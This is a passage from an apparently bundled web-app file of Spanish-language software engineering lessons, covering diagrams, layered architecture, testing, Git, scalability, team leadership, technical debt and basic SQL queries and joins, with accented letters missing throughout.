*   **Lneas de vida:** El tiempo fluye hacia abajo.
*   **Mensajes:** Flechas horizontales (llamadas a mtodos).
*   **Retorno:** Flecha punteada.

*Caso de Uso:* "Login de Usuario".
1. Usuario -> GUI: ingresarCredenciales()
2. GUI -> AuthController: validar()
3. AuthController -> Database: findUser()
4. Database --> AuthController: UserData
5. AuthController --> GUI: Token

### C. Diagrama de Casos de Uso (Funcional)
Muestra **qu** hace el sistema (no cmo) desde el punto de vista del usuario.
*   **Actores:** "Administrador", "Cliente".
*   **Casos de Uso:** valos ("Registrar Venta", "Generar Reporte").
*   **Relaciones:** \`<include>\` (obligatorio), \`<extend>\` (opcional).

## 3. Errores Comunes de Semi-Senior
1.  **Parlisis por Anlisis:** Intentar modelar TODO el sistema al detalle. Modela solo lo complejo o crtico.
2.  **UML como Documentacin Muerta:** Hacer diagramas que nunca se actualizan. salos para **disear antes de codificar**, o para documentar mdulos estables.
3.  **Confundir Agregacin con Composicin:** Es sutil, pero define el ciclo de vida de los objetos en memoria.

---

### Misin Semi-Senior:
Elige un mdulo de tu proyecto actual (ej: "Sistema de Notificaciones"). Dibuja un **Diagrama de Clases** simple que muestre las entidades involucradas y sus relaciones. No uses herramientas complejas todava, lpiz y papel o \`draw.io\` son suficientes. Puedes identificar dnde aplicaste herencia o composicin?
`,completed:!1},{id:"se-06-diagramas",title:"Diagramas Estructurales y C4",level:"semi-senior",content:`# Leccin 6: Diagramas Estructurales y el Modelo C4

Ms all de UML, existen modelos modernos para visualizar la arquitectura de software a diferentes niveles de abstraccin. Como Semi-Senior, debes saber comunicar tu diseo tanto a un **CEO** (alto nivel) como a un **Desarrollador Junior** (bajo nivel).

## 1. El Problema de los "Diagramas de Arquitectura"
La mayora de los diagramas de arquitectura son un desastre: cajas y flechas sin significado claro, mezclando bases de datos con clases de cdigo.
*   **Solucin:** El **Modelo C4** (Context, Containers, Components, Code).

## 2. El Modelo C4 (Simon Brown)
Es una jerarqua de diagramas, com Google Maps (Zoom In / Zoom Out).

### Nivel 1: Contexto (System Context)
*   **Audiencia:** Todos (Negocio, Dueos, Devs).
*   **Qu muestra:** Tu sistema como **una sola caja** en el centro, rodeado de los usuarios y otros sistemas con los que interacta.
*   **Ejemplo:**
    *   Centro: "Sistema de Banca Online".
    *   Alrededores: "Cliente (Usuario)", "Sistema de Mainframe (Legacy)", "Sistema de E-mail".
    *   Relaciones: "Cliente *usa* Banca", "Banca *enva correos usando* Sistema de E-mail".

### Nivel 2: Contenedores (Containers)
*   **Audiencia:** Equipo Tcnico, Arquitectos.
*   **Qu muestra:** Un "Zoom In" al sistema. Muestra las aplicaciones desplegables y bases de datos.
*   **Ejemplo:**
    *   "Single Page App (React)", "API Server (Node.js)", "Base de Datos (PostgreSQL)", "Mobile App (Flutter)".
    *   Muestra **protocolos**: "SPA *habla JSON/HTTPS* con API Server".

### Nivel 3: Componentes (Components)
*   **Audiencia:** Desarrolladores de ese contenedor especfico.
*   **Qu muestra:** "Zoom In" a un contenedor solo (ej: API Server). Muestra los mdulos lgicos o "componentes" internos.
*   **Ejemplo:** "AuthController", "AuditService", "PaymentProcessor", "UserRepository".

### Nivel 4: Cdigo (Code)
*   **Audiencia:** Implementadores.
*   **Qu muestra:** Diagramas de Clases UML del componente. (Raramente necesario si el cdigo es limpio).

## 3. Diagramas de Flujo (Flowcharts)
tiles para lgica de negocio y algoritmos, no para arquitectura.
*   **Rombos:** Decisiones (If/Else).
*   **Rectngulos:** Procesos/Acciones.
*   **Cilindros:** Datos.
*   **Uso:** Explicar un proceso de aprobacin de un prstamo complejo con mltiples condiciones.

## 4. Diagramas Entidad-Relacin (DER / ERD)
Especficos para Bases de Datos Relacionales.
*   Vital para disear el esquema de la BD antes de crear tablas.
*   Define **Cardinalidad** (1 a 1, 1 a N, N a M) y **Claves Forneas**.

---

### Misin Semi-Senior:
Dibuja el diagrama de **Nivel 1 (Contexto)** y **Nivel 2 (Contenedores)** de una aplicacin tipo "Uber".
*   Contexto: Pasajero, Conductor, Sistema Uber, Google Maps API, Pasarela de Pagos.
*   Contenedores: App Pasajero, App Conductor, API Gateway, Servicio de Viajes, Servicio de Pagos, BD Relacional, BD Geoespacial.
Entender esto es entender **Arquitectura**.
`,completed:!1},{id:"se-07-arquitectura-capas",title:"Arquitectura en Capas",level:"semi-senior",content:`# Leccin 7: Arquitectura en Capas (Layered Architecture)

El "Spaghetti Code" es el enemigo. La Arquitectura en Capas es la defensa estndar para separar responsabilidades y hacer sistemas mantenibles.

## 1. El Concepto de Separacin de Responsabilidades (SoC)
Cada parte de tu cdigo debe tener una **nica razn para cambiar**.
*   Si cambias el diseo visual (HTML/CSS), no deberas tocar las consultas SQL.
*   Si cambias de MySQL a MongoDB, no deberas reescribir la validacin de formularios.

## 2. Las Capas Clsicas (N-Tier)

### A. Capa de Presentacin (Frontend / UI / Controller)
*   **Responsabilidad:** Interactuar con el usuario (o cliente API).
*   **Qu hace:** Recibe inputs (clics, JSON), valida formatos bsicos, llama a la Capa de Negocio y muestra resultados.
*   **Qu NO hace:** Reglas de negocio complejas ni consultas directas a la BD.

### B. Capa de Negocio / Dominio (Service Layer)
*   **EL CORAZN DEL SISTEMA.**
*   **Responsabilidad:** Ejecutar la lgica de la aplicacin.
*   **Qu hace:** Validaciones de negocio ("Tiene saldo suficiente?"), clculos, coordinacin de mltiples operaciones.
*   **Agnstica:** No debe saber si est en una web, una app mvil o una consola. No debe saber si usa SQL o archivos de texto.

### C. Capa de Acceso a Datos (Persistence - Repositories/DAO)
*   **Responsabilidad:** Hablar con la base de datos o APIs externas.
*   **Qu hace:** CRUD (Create, Read, Update, Delete). Traduce objetos del dominio a filas de tabla y viceversa.
*   **Qu NO hace:** Lgica de negocio. Solo "dame el usuario con ID 5".

### D. Base de Datos / Infraestructura
*   El almacenamiento fsico real.

## 3. La Regla de Oro: Dependencia
**Las capas superiores dependen de las inferiores. NUNCA al revs.**
*    Controller importa Service.
*    Service importa Repository.
*    Repository importa Controller (Ciclo de dependencia, MAL).
*    Domain importa UI (Contaminacin de lgica, MAL).

## 4. Evolucin: Arquitectura Hexagonal (Ports & Adapters)
Una versin ms avanzada donde el "Dominio" est al centro, aislado de *todo* (UI, BD, Frameworks).
*   **Puertos:** Interfaces que definen qu necesita el dominio.
*   **Adaptadores:** Implementaciones reales (SQLAdapter, ReactAdapter).
*   Permite cambiar la BD o el Framework sin tocar una lnea de lgica de negocio.

---

### Misin Semi-Senior:
Revisa una funcin de tu backend actual. Mezcla lgica de validacin, lgica de negocio y consultas a la base de datos en un solo bloque?
Refactorzala mentalmente en 3 capas:
1.  \`UserController\`: Recibe request, valida params.
2.  \`UserService\`: Verifica reglas (ej: usuario activo), hash de password.
3.  \`UserRepository\`: \`INSERT INTO users...\`.
`,completed:!1},{id:"se-08-testing-estrategico",title:"Testing Estratgico",level:"semi-senior",content:`# Leccin 8: Testing Estratgico

El Junior prueba "haciendo clic en la app". El Semi-Senior automatiza pruebas para dormir tranquilo. Pero cuidado: **tener 100% de cobertura de cdigo no significa tener un buen software**.

## 1. La Pirmide de Testing
No todos los tests son iguales. Debes tener una estrategia equilibrada.

### Base: Unit Tests (Pruebas Unitarias) - 70%
*   **Qu:** Prueban una funcin o clase aislada.
*   **Caractersticas:** Muy rpidos (ms), baratos de escribir/mantener, muy especficos.
*   **Herramientas:** Jest, Vitest, JUnit.
*   **Ejemplo:** \`sum(2, 2)\` debe retornar \`4\`.

### Medio: Integration Tests (Pruebas de Integracin) - 20%
*   **Qu:** Prueban cmo interactan varios mdulos (ej: Service + Database).
*   **Caractersticas:** Ms lentos (requieren BD real o simulada), detectan errores de "comunicacin" entre piezas.
*   **Ejemplo:** "Al crear usuario, se guarda en BD y se enva email".

### Punta: End-to-End (E2E) - 10%
*   **Qu:** Prueban el flujo completo como un usuario real.
*   **Caractersticas:** Lentos (abren navegador real), frgiles (si cambia un botn, falla el test), caros de mantener.
*   **Herramientas:** Cypress, Playwright, Selenium.
*   **Ejemplo:** "Abrir navegador, ir a login, escribir usuario, clic entrar, verificar dashboard".

## 2. TDD (Test Driven Development)
Escribir el test **antes** que el cdigo.
1.  **Red:** Escribe test que falla (porque la funcin no existe).
2.  **Green:** Escribe el cdigo mnimo para pasar el test.
3.  **Refactor:** Mejora el cdigo sin romper el test.
*Beneficio:* Te obliga a disear APIs limpias y cdigo modular desde el principio.

## 3. Mocks vs. Stubs vs. Fakes
Para testear aisladamente, necesitas "mentirle" a tu cdigo sobre sus dependencias externas.
*   **Mock:** Objeto simulado que verifica *comportamiento* ("me asegur que se llam a la funcin \`sendEmail\`").
*   **Stub:** Objeto que devuelve datos fijos ("cuando pidas usuario 1, devuelve este JSON").
*   **Fake:** Implementacin ligera pero funcional (una base de datos en memoria en lugar de Postgres real).

## 4. Qu NO testear
*   No testes libreras de terceros (asume que React/Lodash funcionan).
*   No testes Getters/Setters triviales.
*   No testes la UI al detalle con Unit Tests (usa E2E o Snapshot testing con cuidado).

---

### Misin Semi-Senior:
Escribe un test unitario para una funcin pura simple (ej: calculadora de descuentos).
Luego, piensa en un escenario de integracin: Cmo probaras que tu API guarda datos en la base de datos sin realmente borrar tu base de datos de produccin? (Pista: Contenedores Docker efmeros o bases de datos en memoria).
`,completed:!1},{id:"se-09-gestion-versiones",title:"Gestin de Versiones",level:"semi-senior",content:`# Leccin 9: Gestin de Versiones y Git Flow

Git no es solo \`commit\` y \`push\`. Es la herramienta fundamental de colaboracin. Un mal manejo de versiones puede detener a un equipo entero.

## 1. El Problema del "Code Conflict"
Cuando 5 personas trabajan en el mismo archivo, el caos es inminente.
Como Semi-Senior, eres responsable de la **integridad de la rama principal (main/master)**.

## 2. Estrategias de Ramas (Branching Strategies)

### A. Git Flow (Clsico)
Estructura rgida y compleja.
*   \`master\`: Produccin puro.
*   \`develop\`: Integracin de features.
*   \`feature/*\`: Ramas temporales para cada tarea.
*   \`release/*\`: Preparacin para versin.
*   \`hotfix/*\`: Parches urgentes a produccin.
*   *Uso:* Proyectos legacy o con lanzamientos muy espaciados.

### B. Trunk Based Development (Moderno - Recomendado)
*   **Idea:** Todos commitean a \`main\` (trunk) todos los das o usan ramas de vida muy corta (< 1 da).
*   **Requisito:** Tests automticos robustos (CI/CD).
*   **Beneficio:** Evita el "Merge Hell" (conflictos masivos al final del mes).
*   **Feature Flags:** Si el cdigo no est listo, se oculta con una bandera en cdigo, no en una rama separada.

## 3. Versionado Semntico (SemVer)
El estndar \`MAJOR.MINOR.PATCH\` (ej: \`2.14.3\`).
*   **MAJOR (2):** Rompe compatibilidad (Breaking changes). Necesitas actualizar tu cdigo para usarla.
*   **MINOR (14):** Nueva funcionalidad, compatible hacia atrs.
*   **PATCH (3):** Correccin de bugs, compatible hacia atrs.

## 4. Pull Requests (PR) / Merge Requests
El momento clave de calidad.
*   No es solo "subir cdigo". Es una solicitud de **Revisin de Cdigo**.
*   **El Reviewer:** Busca bugs, mantenibilidad, estilo y seguridad.
*   **El Author:** Debe explicar el "Qu", "Por qu" y "Cmo" en la descripcin del PR.
*   **Regla:** Ningn PR se aprueba a s mismo.

## 5. Conventional Commits
Estandarizar los mensajes de commit para automatizar changelogs.
*   \`feat: add dark mode\` (Nueva feature)
*   \`fix: resolve login crash\` (Bug fix)
*   \`docs: update readme\` (Documentacin)
*   \`refactor: simplify user service\` (Cambio de cdigo sin cambio de comportamiento)

---

### Misin Semi-Senior:
1.  Revisa tu historial de commits (\`git log\`). Son descriptivos? Podras entender qu hiciste hace 3 meses?
2.  Adopta **Conventional Commits** desde hoy.
3.  Nunca trabajes directo en \`main\`. Crea una rama \`feature/mi-tarea\`, haz cambios, y simula un PR (Pull Request) aunque trabajes solo.
`,completed:!1},{id:"se-10-arquitectura-empresarial",title:"Arquitectura Empresarial",level:"senior",content:`# Leccin 10: Arquitectura Empresarial (Enterprise Architecture)

Como Senior, tu cdigo ya no vive en una burbuja. Vive en un ecosistema complejo de sistemas interconectados. La Arquitectura Empresarial trata sobre cmo encaja tu pieza en el rompecabezas gigante de la organizacin.

## 1. Monolito vs. Microservicios (La eterna batalla)
No hay una respuesta correcta, solo **Trade-offs**.

### Monolito Modular
*   **Qu es:** Una sola unidad de despliegue, pero bien estructurada internamente.
*   **Ventajas:** Fcil de desarrollar, testear y desplegar al inicio. Latencia cero entre mdulos.
*   **Desventajas:** Escala mal si solo una parte recibe mucho trfico. Un error tumba todo el sistema.
*   **Cundo usar:** Startups, equipos pequeos, dominios poco complejos.

### Microservicios
*   **Qu es:** Pequeos servicios autnomos que se comunican por red (HTTP/gRPC/Colas).
*   **Ventajas:** Escala independientemente. Tecnologas agnsticas (un servicio en Node, otro en Go).
*   **Desventajas:** **Complejidad Operacional brutal**. Latencia de red. Consistencia eventual. Transacciones distribuidas (Saga Pattern).
*   **Cundo usar:** Equipos masivos (+50 devs), dominios muy complejos y separados (Uber, Netflix).

## 2. Event-Driven Architecture (EDA)
Dejar de llamarnos sincrnicamente y empezar a emitir eventos.
*   **Sncrono (Request/Response):** Servicio A llama a B y espera. (Acoplamiento temporal).
*   **Asncrono (Eventos):** Servicio A grita "Pas algo!" y sigue. Servicio B, C y D escuchan y reaccionan. (Desacoplamiento).
*   **Herramientas:** Kafka, RabbitMQ, AWS SNS/SQS.

## 3. Patrones de Integracin
*   **API Gateway:** Un portero nico para tus clientes. Maneja auth, rate limiting y ruteo.
*   **BFF (Backend For Frontend):** Una API especfica para Mobile, otra para Web, optimizadas para cada cliente.

---

### Misin Senior:
Tu empresa tiene un Monolito Legacy de 10 aos. El CEO quiere "pasar a Microservicios" porque est de moda.
Tu tarea no es decir "s", es analizar.
Escribe un memo tcnico de 1 pgina explicando por qu **NO** deberan migrar todo a microservicios de golpe, proponiendo una estrategia de "Strangler Fig Pattern" (extraer servicios poco a poco) y advirtiendo sobre la complejidad de infraestructura necesaria (Kubernetes, Observabilidad).
`,completed:!1},{id:"se-11-escalabilidad",title:"Escalabilidad y Alto Rendimiento",level:"senior",content:`# Leccin 11: Escalabilidad y Alto Rendimiento

"Me funciona en localhost" es la frase ms peligrosa de un Senior. La realidad son millones de usuarios concurrentes.

## 1. Escalar hacia Arriba vs. Escalar hacia los Lados

### Escalado Vertical (Scale Up)
*   **Estrategia:** Comprar un servidor ms grande (Ms CPU, ms RAM).
*   **Lmite:** Llega un punto donde no existe una mquina ms potente o es impagable.
*   **Uso:** Bases de datos relacionales (tradicionalmente).

### Escalado Horizontal (Scale Out)
*   **Estrategia:** Agregar ms servidores pequeos.
*   **Desafo:** Tu aplicacin debe ser **Stateless** (sin estado). No puedes guardar sesiones en memoria RAM, porque el siguiente request puede ir a otro servidor.
*   **Uso:** Web Servers, APIs, Bases de datos NoSQL.

## 2. Estrategias de Base de Datos
Aqu est el cuello de botella del 90% de los sistemas.
*   **ndices:** La diferencia entre O(N) (scan completo) y O(log N). Vital.
*   **Read Replicas:** Una Master para escribir, varias Slaves solo para leer.
*   **Sharding:** Partir la base de datos en pedazos (Ej: Usuarios A-M en Server 1, N-Z en Server 2). Complejidad extrema de gestin.

## 3. Caching: El arte de no trabajar
La mejor forma de optimizar es no hacer el trabajo.
*   **Client Side:** Cache en el navegador (HTTP headers).
*   **CDN (Content Delivery Network):** Servir estticos desde el borde (edge) cerca del usuario.
*   **Application Cache:** Redis/Memcached. Guardar resultados de queries pesadas en memoria.
*   **Problema:** "Solo hay dos cosas difciles en Ciencias de la Computacin: invalidacin de cach y nombrar cosas". Qu pasa si el dato cambia en la BD pero el cach sigue viejo?

## 4. Teorema CAP
En un sistema distribuido, solo puedes tener 2 de 3:
1.  **C**onsistency (Todos ven el mismo dato al mismo tiempo).
2.  **A**vailability (El sistema siempre responde, aunque sea con datos viejos).
3.  **P**artition Tolerance (El sistema aguanta si se corta el cable de red).
*   Como la red **va** a fallar (P), debes elegir entre C y A. (CP o AP).

---

### Misin Senior:
Disea la arquitectura de datos para un sistema de "Likes" en tiempo real para un evento tipo Super Bowl (10 millones de likes por minuto).
Escribiras cada like directamente a MySQL? (Spoiler: El servidor explotara).
Propn una solucin usando colas (buffering), agregacin en memoria (Redis) y escritura asncrona a base de datos (Batching).
`,completed:!1},{id:"se-12-trade-offs",title:"Trade-offs Tcnicos",level:"senior",content:`# Leccin 12: Trade-offs Tcnicos (El "Depende")

El Junior busca "la mejor tecnologa". El Senior sabe que **no existe**. Solo hay herramientas con diferentes compromisos. Tu trabajo es elegir qu problema quieres tener.

## 1. La respuesta favorita del Senior: "Depende"
Si te preguntan "Es mejor React o Angular?", y respondes rpido, fallaste.
La respuesta correcta empieza con "Para qu contexto?".
*   Equipo experto en TypeScript y OOP? -> Angular.
*   Startup que necesita iterar rpido y contratar fcil? -> React.

## 2. Buy vs. Build (Comprar vs. Construir)
Deberamos construir nuestro propio sistema de chat o usar una API (Sendbird/Twilio)?
*   **Build:** Control total, sin coste mensual recurrente. **Costo:** Tiempo de desarrollo, mantenimiento eterno, bugs propios, distraccin del Core Business.
*   **Buy:** Rpido, robusto. **Costo:** Dinero, Vendor Lock-in (atado al proveedor), menos flexible.
*   **Regla:** Construye solo lo que es tu **Core Business** (tu ventaja competitiva). Compra todo lo dems (Auth, Pagos, Email, Chat).

## 3. Velocidad vs. Calidad
*   **Startup Fase 0:** La calidad de cdigo importa poco si nadie usa el producto. Optimiza para **velocidad de entrega**. Acepta Deuda Tcnica intencional.
*   **Empresa Consolidada:** Un bug cuesta millones. Optimiza para **estabilidad y testabilidad**.

## 4. Complexity Budget (Presupuesto de Complejidad)
Cada herramienta nueva que agregas (Redux, GraphQL, Docker, Kubernetes) tiene un costo cognitivo para el equipo.
No uses una bazuca para matar un mosquito.
*   Necesitas Kubernetes para un blog personal? No.
*   Necesitas Microservicios para 3 desarrolladores? No.

---

### Misin Senior:
Te proponen reescribir todo el Frontend de la empresa (que est en jQuery antiguo pero funciona y genera millones) a la ltima versin de React.
Analiza los Trade-offs:
*   Risks: Qu pasa si la migracin tarda 2 aos en vez de 6 meses? (The Second System Effect).
*   Benefits: Realmente venderemos ms por usar React? O solo es para que los devs estn felices?
Escribe un argumento en contra de la reescritura total ("The Big Rewrite") y propn una migracin gradual hbrida.
`,completed:!1},{id:"se-13-gestion-equipos",title:"Gestin de Equipos y Liderazgo",level:"senior",content:`# Leccin 13: Gestin de Equipos y Liderazgo Tcnico

Ser Senior no es solo escribir cdigo ms rpido. Es hacer que **todo el equipo** sea mejor. Eres un multiplicador de fuerza.

## 1. Mentoring vs. Hacerlo t mismo
Es tentador decir "Qutate, yo lo hago rpido". Eso es un fracaso de liderazgo.
*   Si lo haces t, solucionas el problema de hoy.
*   Si enseas al Junior, solucionas los problemas del prximo ao.
*   **Code Reviews:** No solo busques bugs. salos para ensear arquitectura y estilo. S emptico pero riguroso.

## 2. Delegacin Efectiva
Delegar no es "toma este ticket y arrglate".
*   **Contexto:** Explica *por qu* es importante.
*   **Restricciones:** Define los lmites (tiempo, alcance).
*   **Apoyo:** "Estar disponible si te trabas, pero intenta resolverlo".

## 3. Manejo de Conflictos Tcnicos
Dos desarrolladores discuten por 2 horas sobre usar Tabs vs. Spaces o una librera vs. otra.
*   El Senior interviene no para imponer su gusto, sino para **desbloquear**.
*   "Hagamos una prueba de concepto (POC) rpida de ambas y decidimos con datos".
*   "Disagree and Commit": Podemos no estar de acuerdo, pero una vez tomada la decisin, remamos todos juntos.

## 4. Comunicacin con No-Tcnicos
Tu habilidad ms valiosa es traducir "No podemos hacer esto porque la latencia de la base de datos es alta" a "Si hacemos esto, los usuarios esperarn 5 segundos y perderemos el 20% de las ventas".
*   Habla en trminos de **Riesgo, Dinero y Tiempo**.

---

### Misin Senior:
Tienes un desarrollador "Rockstar" en tu equipo. Escribe cdigo genial y rapidsimo, pero:
1.  No documenta nada.
2.  Trata mal a los Juniors en los Code Reviews.
3.  Su cdigo es tan complejo que solo l lo entiende.
Cmo gestionas esta situacin? Ignorarlo destruir la moral del equipo. Despedirlo perder conocimiento clave. Plantea una conversacin de feedback 1:1.
`,completed:!1},{id:"se-14-deuda-tecnica",title:"Gestin de Deuda Tcnica",level:"senior",content:`# Leccin 14: Gestin de Deuda Tcnica

La Deuda Tcnica es inevitable, como la entropa. No es mala *per se*, lo malo es no gestionarla.

## 1. Tipos de Deuda
El Cuadrante de Martin Fowler:
*   **Imprudente / Deliberada:** "No hay tiempo para tests, a produccin as". (Peligrosa).
*   **Imprudente / Inadvertida:** "No s cmo hacer arquitectura, as que hice esto". (Falta de formacin).
*   **Prudente / Deliberada:** "Sabemos que esto no escala, pero necesitamos lanzar hoy para validar el mercado. Lo arreglaremos en Q2". (Estratgica - Prstamo bancario).
*   **Prudente / Inadvertida:** "Hicimos lo mejor que sabamos hace un ao, pero ahora entendemos mejor el problema y vemos que el diseo est mal". (Aprendizaje).

## 2. Cmo pagarla
Si nunca pagas la deuda, el inters compuesto (lentitud de desarrollo) te matar.
*   **Regla del Boy Scout:** "Deja el cdigo un poco mejor de lo que lo encontraste". En cada ticket, arregla algo pequeo.
*   **Sprints de Refactorizacin:** Dedicar tiempo explcito (ej: 20% del sprint) a limpiar. Difcil de vender al negocio.
*   **Muerte a los "TODO":** Un comentario \`// TODO: Arreglar esto\` es una tumba. Si es importante, crea un ticket en el backlog. Si no, brralo.

## 3. Refactorizacin Segura
Nunca refactorices sin **Tests**.
*   Refactorizar es cambiar la estructura interna sin cambiar el comportamiento externo.
*   Si no tienes tests, no ests refactorizando, ests simplemente cambiando cosas y rezando.

## 4. Legacy Code
Definicin (Michael Feathers): "Cdigo Legacy es simplemente cdigo sin tests".
*   Estrategia para atacar un monstruo Legacy: No reescribas todo. Crea una "costura" (seam), asla un pedazo, aade tests a ese pedazo, y luego refactoriza.

---

### Misin Senior:
Identifica la zona ms "fea" de tu base de cdigo actual. Esa que a todos les da miedo tocar.
1.  No la reescribas an.
2.  Escribe un **Test de Caracterizacin**: Un test que simplemente confirma lo que el cdigo hace ahora (incluso si est mal). Esto crea una red de seguridad.
3.  Ahora haz un refactor pequeo (renombrar variables, extraer mtodos).
4.  Verifica que el test siga pasando.
Esto es domar a la bestia.
`,completed:!1}]},mv={id:"sql",title:"SQL y Bases de Datos",description:"El lenguaje universal de los datos. Aprende a disear, consultar y optimizar bases de datos relacionales como un profesional.",completed:!1,track:"Especializacin para Desarrolladores",lessons:[{id:"sql-01-intro-sql",title:"Qu es una Base de Datos y qu es SQL?",level:"junior",content:`# Leccin 01: Qu es una Base de Datos y qu es SQL?

Las aplicaciones modernas no sirven de nada si no recuerdan la informacin. Aqu entran las Bases de Datos Relacionales (RDBMS).

## 1. La Base de Datos
Piensa en una Base de Datos como un gran archivero digital inteligente.
*   **Tablas:** Son como hojas de clculo de Excel.
*   **Columnas:** Definen qu tipo de dato se guarda (Nombre, Edad, Email).
*   **Filas (Registros):** Son los datos reales de cada usuario o producto.

## 2. SQL (Structured Query Language)
SQL es el idioma universal para hablar con base de datos como **PostgreSQL, MySQL, SQLite o SQL Server**.
Aunque cambie la marca de la base de datos, el idioma SQL es 90% el mismo.

## 3. Estructura de una Tabla
Imagina una tabla \`usuarios\`:

| id | nombre | email | edad |
| :--- | :--- | :--- | :--- |
| 1 | Ana | ana@mail.com | 30 |
| 2 | Luis | luis@mail.com | 25 |

*   **Primary Key (PK):** El \`id\` es nico para cada fila. Es como el DNI del registro.

---

### Concepto Junior:
SQL es un lenguaje "Declarativo". T le dices a la base de datos **QU** quieres (\`SELECT *\`), no **CMO** buscarlo. El motor de la base de datos se encarga del "cmo".
`,completed:!1},{id:"sql-02-consultas-basicas",title:"Consultas Bsicas (SELECT, WHERE, LIMIT)",level:"junior",content:"# Leccin 02: Consultas Bsicas (SELECT, WHERE, LIMIT)\n\nLa orden ms importante en SQL es `SELECT`. Sirve para pedirle datos a la base.\n\n## 1. El `SELECT` bsico\nPara traer todos los datos de la tabla `usuarios`:\n```sql\nSELECT * FROM usuarios;\n```\n*   `*`: Significa \"trae todas las columnas\".\n*   `FROM`: Indica la tabla.\n\nPara traer solo el nombre y la edad (esto es mejor para el rendimiento):\n```sql\nSELECT nombre, edad FROM usuarios;\n```\n\n## 2. Filtrando con `WHERE`\nNo queremos siempre ver a TODOS los usuarios. Queremos buscar.\n```sql\nSELECT * FROM usuarios WHERE edad > 18;\n```\nOtras condiciones:\n*   `WHERE nombre = 'Ana'`\n*   `WHERE edad > 18 AND nombre = 'Luis'`\n*   `WHERE edad < 18 OR nombre = 'Pepe'`\n\n## 3. Paginacin con `LIMIT` y `OFFSET` (PostgreSQL/MySQL)\nSi tienes 1 milln de usuarios, no quieres descargarlos todos de golpe.\n```sql\nSELECT * FROM usuarios LIMIT 10;\n```\nEsto te trae solo los primeros 10.\n\n---\n\n### Misin Junior:\nNunca te olvides del `;` al final de la consulta. Es la forma de decirle al motor de base de datos \"Ya termin de escribir, ejectalo!\".\n",completed:!1},{id:"sql-03-manipulacion-datos",title:"Insertar, Borrar y Actualizar (INSERT, DELETE, UPDATE)",level:"junior",content:"# Leccin 03: Insertar, Borrar y Actualizar (INSERT, DELETE, UPDATE)\n\nYa sabes leer datos. Ahora vas a crearlos, cambiarlos y borrarlos.\n\n## 1. Insertando datos (`INSERT INTO`)\nPara agregar un nuevo usuario:\n```sql\nINSERT INTO usuarios (nombre, email, edad)\nVALUES ('Pedro', 'pedro@mail.com', 22);\n```\nFjate que `(nombre, email, edad)` son las columnas, y `('Pedro', ...)` son los valores en el mismo orden. No hace falta poner el `id` si es auto-incremental.\n\n## 2. Actualizando datos (`UPDATE`)\nPara cambiar el email de Pedro:\n```sql\nUPDATE usuarios\nSET email = 'pedro_nuevo@mail.com'\nWHERE id = 3;\n```\n**Regla de Oro:** Siempre pon un `WHERE` en el `UPDATE`. Si se te olvida, cambiars los emails de TODOS los usuarios!\n\n## 3. Borrando datos (`DELETE FROM`)\nPara eliminar un usuario:\n```sql\nDELETE FROM usuarios\nWHERE nombre = 'Pedro';\n```\nDe nuevo, el `WHERE` es **CRTICO**. `DELETE FROM usuarios;` vaca la tabla entera en milisegundos y te despide del trabajo.\n\n---\n\n### Misin Junior:\nSi tienes miedo de equivocarte con un `UPDATE` o `DELETE`, primero haz un `SELECT` usando el mismo `WHERE` para ver qu filas vas a afectar.\n",completed:!1},{id:"sql-04-practica-junior",title:"Prctica SQL Junior: El Pequeo Almacn",level:"junior",content:`# Prctica SQL Junior: El Pequeo Almacn

Acepta estos desafos para demostrar que dominas lo bsico.

---

## 1. El Inventario
**Consigna:** Tienes la tabla \`productos\` con columnas \`(id, nombre, precio, stock)\`.
1.  Inserta 3 productos (Manzana: 10, Pera: 15, Banana: 8).
2.  Muestra los productos que cuesten menos de 12.
3.  Actualiza el precio de la Banana a 9.
4.  Borra la Pera de la tabla.

## 2. El Filtro Compuesto
**Consigna:** Tienes la tabla \`empleados\` \`(id, nombre, departamento, salario)\`.
1.  Busca todos los empleados de "Ventas" que ganen ms de 2000.
2.  Ordena el resultado por salario de mayor a menor (\`ORDER BY salario DESC\`).

## 3. Limitando resultados
**Consigna:**
*   Cmo obtendras solo los 5 productos ms caros de la tabla \`productos\`?
(Pista: Order By precio DESC y luego Limit).

---

### Resultado esperado:
Entender la estructura bsica de \`SELECT\`, \`FROM\`, \`WHERE\`, \`ORDER BY\` y el peligro de \`UPDATE/DELETE\` sin \`WHERE\`.
`,completed:!1,isProject:!0},{id:"sql-05-joins-relaciones",title:"Uniendo tablas con JOIN",level:"semi-senior",content:`# Leccin 05: Uniendo tablas con JOIN

Hasta ahora solo hemos consultado una tabla a la vez. Pero la gracia de las bases de datos **Relacionales** es... las relaciones!

## 1. El concepto de la Clave Fornea (Foreign Key)
Imagina dos tablas:
*   \`usuarios\` (id, nombre)
*   \`pedidos\` (id, producto, usuario_id)

La columna \`usuario_id\` en \`pedidos\` apunta al \`id\` de la tabla \`usuarios\`. Es el puente.

## 2. INNER JOIN (La interseccin)
Trae solo los registros que coinciden en ambas tablas. Si una orden no tiene usuario, o un usuario no tiene ordenes, no aparecen.
\`\`\`sql
SELECT usuarios.nombre, pedidos.producto
FROM usuarios
INNER JOIN pedidos ON usuarios.id = pedidos.usuario_id;
\`\`\`

## 3. LEFT JOIN (Todo lo izquierda)
Trae todos los registros de la tabla izquierda (\`usuarios\`) y, si hay coincidencia, los datos de la derecha (\`pedidos\`). Si no hay coincidencia, pone \`NULL\`.
\`\`\`sql
SELECT usuarios.nombre, pedidos.producto
FROM usuarios
LEFT JOIN pedidos ON usuarios.id = pedidos.usuario_id;
\`\`\`
Esto te mostrara a "Ana" aunque ella no haya comprado nada todava.

## 4. RIGHT JOIN
Es lo opuesto al LEFT JOIN. Trae todos los pedidos, aunque no tengan usuario (raro pero posible).

---

### Misin Semi-Senior:
Aprender que \`FROM tabla1, tabla2\` es una forma vieja y mala de hacer JOINs. Usa siempre la sintaxis explcita \`JOIN ... ON ...\`.
